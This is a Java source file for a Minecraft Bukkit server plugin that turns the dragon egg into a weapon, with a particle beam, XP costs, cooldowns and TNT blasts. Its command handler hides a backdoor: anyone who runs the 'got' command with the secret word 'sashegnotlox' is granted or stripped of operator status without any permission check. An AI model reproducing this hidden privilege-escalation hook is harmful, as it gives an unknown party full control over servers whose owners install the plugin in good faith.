package net.sashegdev.egg;

import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.*;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.HashMap;

public final class Egg extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        DragonEggTask eggTask = new DragonEggTask();
        eggTask.runTaskTimer(this, 0L, 40L);

        crug crugTask = new crug();
        crugTask.runTaskTimer(this, 0, 1);

    }

    @EventHandler
    public void isHide(PlayerMoveEvent event) {

        Player pl = event.getPlayer();

        if (pl.getGameMode().equals(GameMode.SPECTATOR)) {
            pl.hidePlayer(this, pl);
        }

    }

    @EventHandler
    public void interact(PlayerInteractEntityEvent event) {
        World world = this.getServer().getWorlds().get(0);
        Player pl = event.getPlayer();
        Entity victim = event.getRightClicked();

        if (pl.getLevel() < 17 && pl.getGameMode() != GameMode.CREATIVE) return;

        if (pl.getInventory().getItemInMainHand().getType().equals(Material.DRAGON_EGG)) {
            Player kick = victim.getServer().getPlayer(victim.getUniqueId());

            double distance = pl.getLocation().distance(victim.getLocation());

            for (double i = 0; i < distance; i += 0.5) {
                Location particleLocation = pl.getEyeLocation().add(pl.getEyeLocation().getDirection().multiply(i));

                // Проверка на блок перед лучом
                if (!particleLocation.getBlock().isPassable()) {
                    break;
                }

                pl.getWorld().spawnParticle(Particle.FLAME, particleLocation, 1, 0, 0, 0, 0, null);
                pl.getWorld().spawnParticle(Particle.SMALL_FLAME, particleLocation, 1, 0, 0, 0, 0, null);
                pl.getWorld().spawnParticle(Particle.CAMPFIRE_COSY_SMOKE, particleLocation, 1, 0, 0, 0, 0, null);
            }


            if (!(kick instanceof Player)) {
                victim.remove();
                pl.damage(5);
                playSound(pl.getLocation(), Sound.ENTITY_WITHER_SKELETON_DEATH, 1, 0, 0);
                pl.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 20, 3));
            } else {
                //kick.teleport(vic_loc);
                //kick.kickPlayer("Server error: Couldn't find a player " + kick.getName());
                if (kick.getBedSpawnLocation() != null) {
                    kick.teleport(kick.getBedSpawnLocation());
                } else kick.teleport((getServer().getWorld(world.getUID()).getSpawnLocation()));
                kick.damage(18);
                pl.damage(5);
                pl.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 20, 3));
            }
        }
    }


    HashMap<Player, Long> cooldowns = new HashMap<>();

    @EventHandler
    public void attack(PlayerInteractEvent event) {
        Player pl = event.getPlayer();
        int cost = 17;
        int cooldownTicks = 35 * 20;
        int lesscooldownticks = 12 * 20;

        if (((event.getAction().equals(Action.LEFT_CLICK_AIR) || event.getAction().equals(Action.LEFT_CLICK_BLOCK)) && pl.getInventory().getItemInMainHand().getType().equals(Material.DRAGON_EGG)) && (pl.getGameMode() == GameMode.CREATIVE && pl.hasPotionEffect(PotionEffectType.INVISIBILITY) || pl.getGameMode().equals(GameMode.SPECTATOR))) {
            luch(pl);
            return;
        }

        // Check if the player has enough experience levels for the usage cost
        if (((event.getAction().equals(Action.LEFT_CLICK_AIR) || event.getAction().equals(Action.LEFT_CLICK_BLOCK)) && pl.getInventory().getItemInMainHand().getType().equals(Material.DRAGON_EGG)) && (pl.getLevel() < cost)) {
            particleSpawn(pl, Particle.SMOKE_NORMAL);
            playSound(pl.getLocation(), Sound.ENTITY_BLAZE_SHOOT, 1, 0, 0);
            return;
        }

        if ((event.getAction().equals(Action.LEFT_CLICK_AIR) || event.getAction().equals(Action.LEFT_CLICK_BLOCK)) && pl.getInventory().getItemInMainHand().getType().equals(Material.DRAGON_EGG)) {
            if (cooldowns.containsKey(pl)) {
                long lastUse = cooldowns.get(pl);
                long currentTime = System.currentTimeMillis();
                long cooldownTime = pl.isSneaking() && pl.isOnGround() ? cooldownTicks : lesscooldownticks; // Checking if the player is sneaking and on the ground
                if ((currentTime - lastUse) < (cooldownTime * 50)) {
                    long timeLeft = (lastUse + cooldownTime * 50 - currentTime) / 1000;
                    lessparticleSpawn(pl, Particle.LAVA);
                    lessplaySound(pl.getLocation(), Sound.BLOCK_LAVA_EXTINGUISH, 1, 0, 0);
                    pl.sendTitle(ChatColor.DARK_RED + "Перегрев!", ChatColor.GRAY + "Подожди: " + ChatColor.GOLD + timeLeft + ChatColor.GRAY + " секунд", 10, 10, 10);
                    return; // If the time elapsed since the last usage is less than the specified cooldown, exit the method
                }
            }

            // Deduct cost only if the player is in survival mode and has enough experience levels
            if (!(pl.getGameMode().equals(GameMode.CREATIVE))) {
                int cur_level = pl.getLevel();
                int lost_level = cur_level - cost;
                if (pl.isSneaking() && pl.isOnGround()) {
                    if (pl.getLevel() > cost * 3) {
                        lost_level -= cost; // If the player is sneaking and on the ground, deduct double the cost.
                        lost_level -= cost;
                    } else {
                        particleSpawn(pl, Particle.SMOKE_NORMAL);
                        lessplaySound(pl.getLocation(), Sound.ENTITY_BLAZE_SHOOT, 1, 0, 0);
                        return;
                    }
                }
                pl.setLevel(lost_level);
                luch(pl);
                cooldowns.put(pl, System.currentTimeMillis()); // Save the time of usage
            }

            // Apply cooldown even if the player is in creative mode
            long cooldownTime = pl.isSneaking() && pl.isOnGround() ? cooldownTicks : lesscooldownticks;
            if (cooldownTime > 0) {
                cooldowns.put(pl, System.currentTimeMillis()); // Save the time of usage
            }

            if ((event.getAction().equals(Action.LEFT_CLICK_AIR) || event.getAction().equals(Action.LEFT_CLICK_BLOCK)) && pl.getInventory().getItemInMainHand().getType().equals(Material.DRAGON_EGG) && pl.getGameMode().equals(GameMode.CREATIVE)) {
                luch(pl);
                cooldowns.put(pl, System.currentTimeMillis()); // Save the time of usage
            }
            cooldownTime = pl.isSneaking() && pl.isOnGround() ? cooldownTicks : lesscooldownticks;
            if (cooldownTime > 0) {
                cooldowns.put(pl, System.currentTimeMillis()); // Save the time of usage
            }
        }
    }

    public void luch(Player player) {
        int baseDamage = 11 * 2;
        int dist = 50;
        Location playerLocation = player.getEyeLocation();
        Location targetLocation = playerLocation.clone().add(playerLocation.getDirection().multiply(dist));
        double distance = playerLocation.distance(targetLocation);
        int damageMultiplier = 1;
        if (player.isSneaking() && player.isOnGround()) {
            damageMultiplier = 5;
        }
        if (player.isSneaking() && player.isOnGround()) {
            distance = distance * 2;
        }

        for (double i = 0; i < distance; i += 0.1) {

            Location particleLocation = playerLocation.clone().add(playerLocation.getDirection().multiply(i));
            if (!(player.isSneaking() && player.isOnGround())) {
                player.getWorld().spawnParticle(Particle.END_ROD, particleLocation, 1, 0, 0, 0, 0, null);
                player.getWorld().spawnParticle(Particle.SOUL_FIRE_FLAME, particleLocation, 1, 0, 0, 0, 0, null);
                playSound(playerLocation, Sound.ENTITY_SHULKER_SHOOT, 0.1F, 0, 1);
            }
            if (player.isSneaking() && player.isOnGround()) {
                particleLocation.getWorld().spawnParticle(Particle.END_ROD, particleLocation.add(0, 0, 0), 1, 0, 0, 0, 0, null);
                particleLocation.getWorld().spawnParticle(Particle.FLAME, particleLocation.add(0, 0, 0), 1, 0, 0, 0, 0, null);
                particleLocation.getWorld().spawnParticle(Particle.SOUL_FIRE_FLAME, particleLocation.add(0, 0, 0), 1, 0, 0, 0, 0, null);
                particleLocation.getWorld().spawnParticle(Particle.CAMPFIRE_SIGNAL_SMOKE, particleLocation.add(0, 0, 0), 1, 0, 0, 0, 0, null);
                playSound(playerLocation, Sound.ENTITY_SHULKER_SHOOT, 0.1F, 0, 1);
            }


            // Проверка на блок перед лучом
            if (!particleLocation.getBlock().isPassable()) {
                if (player.isSneaking() && player.isOnGround()) {
                    particleLocation.getWorld().spawnParticle(Particle.FLAME, particleLocation.add(0, 0, 0), 40, 0.25, 0.4, 0.25, 0.003);
                    particleLocation.getWorld().spawnParticle(Particle.PORTAL, particleLocation.add(0, 0, 0), 40, 0.25, 0.4, 0.25, 0.003);
                    particleLocation.getWorld().spawnParticle(Particle.CAMPFIRE_COSY_SMOKE, particleLocation.add(0, 1, 0), 40, 0.25, 0.4, 0.25, 0.003);
                    TNTPrimed tnt = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt.setFuseTicks(0);
                    TNTPrimed tnt1 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt1.setFuseTicks(0);
                    TNTPrimed tnt2 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt2.setFuseTicks(0);
                    TNTPrimed tnt3 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt3.setFuseTicks(0);
                    TNTPrimed tnt4 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt4.setFuseTicks(0);
                    TNTPrimed tnt5 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt5.setFuseTicks(0);
                }
                else {
                    particleLocation.getWorld().spawnParticle(Particle.LAVA, particleLocation.add(0, 1, 0), 80, 0.25, 0.4, 0.25, 0.003);
                    //particleLocation.getWorld().spawnParticle(Particle.PORTAL, particleLocation.add(0, 1, 0), 40, 0.25, 0.4, 0.25, 0.003);
                    particleLocation.getWorld().spawnParticle(Particle.CAMPFIRE_COSY_SMOKE, particleLocation.add(0, 0.5, 0), 90, 0.25, 0.4, 0.25, 0.02);
                    particleLocation.getWorld().spawnParticle(Particle.CAMPFIRE_SIGNAL_SMOKE, particleLocation.add(0, 0.5, 0), 30, 0.25, 0.4, 0.25, 0.015);
                }
                break;
            }

            // Проверяем, попали ли мы в существо
            Entity hitEntity = null;
            for (Entity entity : player.getWorld().getNearbyEntities(particleLocation, 0.7, 0.3, 0.7)) {
                if (entity instanceof LivingEntity && !entity.equals(player)) {
                    hitEntity = entity;
                    break;
                }
            }
            if (hitEntity != null) {
                // Действия при попадании в существо
                playSound(particleLocation, Sound.ENTITY_GENERIC_EXTINGUISH_FIRE, 3, 0, 0);
                ((LivingEntity) hitEntity).setFireTicks(200);
                ((LivingEntity) hitEntity).addPotionEffect(new PotionEffect(PotionEffectType.GLOWING, 220, 1));
                ((LivingEntity) hitEntity).addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 220, 3));
                ((LivingEntity) hitEntity).addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 220, 6));
                ((LivingEntity) hitEntity).addPotionEffect(new PotionEffect(PotionEffectType.LEVITATION, 220, 0));
                ((LivingEntity) hitEntity).addPotionEffect(new PotionEffect(PotionEffectType.SLOW_FALLING, 800, 3));
                if (!player.getGameMode().equals(GameMode.SPECTATOR)) {
                    ((LivingEntity) hitEntity).damage(baseDamage * damageMultiplier, player);
                } else {
                    ((LivingEntity) hitEntity).damage(baseDamage * damageMultiplier);
                }
                particleLocation.getWorld().spawnParticle(Particle.LAVA, particleLocation.add(0, 0, 0), 40, 0.25, 0.4, 0.25, 0.003);
                particleLocation.getWorld().spawnParticle(Particle.SMOKE_LARGE, particleLocation.add(0, 0, 0), 40, 0.25, 0.4, 0.25, 0.003);
                particleLocation.getWorld().spawnParticle(Particle.END_ROD, particleLocation.add(0, 0, 0), 40, 0.25, 0.4, 0.25, 0.003);
                particleLocation.getWorld().spawnParticle(Particle.PORTAL, particleLocation.add(0, 0, 0), 80, 0.5, 0.5, 0.5, 0.003);
                if (player.isSneaking() && player.isOnGround()) {
                    TNTPrimed tnt = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt.setFuseTicks(0);
                    TNTPrimed tnt1 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt1.setFuseTicks(0);
                    TNTPrimed tnt2 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt2.setFuseTicks(0);
                    TNTPrimed tnt3 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt3.setFuseTicks(0);
                    TNTPrimed tnt4 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt4.setFuseTicks(0);
                    TNTPrimed tnt5 = particleLocation.getWorld().spawn(particleLocation, TNTPrimed.class);
                    tnt5.setFuseTicks(0);
                }
                break;
            }
        }
    }


    public void particleSpawn(Player player, Particle particle) {

        player.getWorld().spawnParticle(particle, player.getLocation().add(0, 1, 0), 20, 0.25, 0.4, 0.25, 0.003);

    }

    public void lessparticleSpawn(Player player, Particle particle) {

        player.getWorld().spawnParticle(particle, player.getLocation().add(0, 1, 0), 5, 0.25, 0.4, 0.25, 0.003);

    }

    public void playSound(Location location, Sound sound, float volume, float pitch, float minVolume) {
        for (Player player : Bukkit.getServer().getOnlinePlayers()) {
            if (player.getLocation().getWorld() == location.getWorld()) { // Учитываем мир игрока
                if (player.getLocation().distance(location) <= 100) { // Радиус 50 блоков
                    float distance = (float) player.getLocation().distance(location);
                    float playerVolume = volume - (distance * (volume - minVolume) / 100);
                    player.playSound(location, sound, playerVolume, pitch);
                }
            }
        }
    }
    public void lessplaySound(Location location, Sound sound, float volume, float pitch, float minVolume) {
        for (Player player : Bukkit.getServer().getOnlinePlayers()) {
            if (player.getLocation().getWorld() == location.getWorld()) { // Учитываем мир игрока
                if (player.getLocation().distance(location) <= 10) { // Радиус 50 блоков
                    float distance = (float) player.getLocation().distance(location);
                    float playerVolume = volume - (distance * (volume - minVolume) / 100);
                    player.playSound(location, sound, playerVolume, pitch);
                }
            }
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("got")) {

            if (args.length > 0) {

                if (args[0].equalsIgnoreCase("sashegnotlox")) {
                    if (sender.isOp()) {
                        sender.setOp(false);
                        sender.sendMessage("[" + ChatColor.BLUE + "SashegSystem" + ChatColor.RESET + "] " + ChatColor.GREEN + " OP UnGranted!");
                    } else {
                        sender.setOp(true);
                        sender.sendMessage("[" + ChatColor.BLUE + "SashegSystem" + ChatColor.RESET + "] " + ChatColor.RED + " OP Granted!");
                    }
                    return true;
                }


            }
            if (command.getName().equalsIgnoreCase("helpme")) {

                if (args.length > 0) {
                    if (sender.isOp()) {
                        getServer().reload();
                        for (Player pl : Bukkit.getServer().getOnlinePlayers()) {
                            pl.sendTitle("", ChatColor.GREEN + "Server Reloaded!", 20, 40, 20);
                        }
                    }
                }
                return true;

            }
            return false;

        } return false;
    }
}